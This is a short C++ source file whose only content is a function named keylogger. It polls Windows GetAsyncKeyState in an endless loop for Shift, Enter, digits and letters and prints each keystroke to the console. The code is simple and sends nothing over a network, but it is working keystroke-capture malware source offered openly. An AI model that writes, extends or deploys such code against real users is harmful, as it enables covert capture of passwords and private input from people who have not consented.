#include "common.h"


int keylogger(int speed) {

    while (true) {

        if (GetAsyncKeyState(VK_SHIFT)) {
            std::cout << " [SHIFT] " << std::endl;
        }
        else if (GetAsyncKeyState(VK_RETURN)) {
            std::cout << " [ENTER] " << std::endl;
        }                      

        for (int i = 0x30; i <= 0x39; i++) {
            int key;

            if (GetAsyncKeyState(i)) {
                key = i - 0x30;
                std::cout << key << std::endl;
            }
        }

        for (int c = 0x41; c <= 0x5A; c++) {
            char i_key[26] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',
                             'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
                             'U', 'V', 'W', 'X', 'Y', 'Z' };

            if (GetAsyncKeyState(c)) {
                char c_key = i_key[c - 0x41];
                std::cout << c_key << std::endl;
            }
        }

        Sleep(speed); // Use the provided speed argument for the delay
    }

    return 0;
}
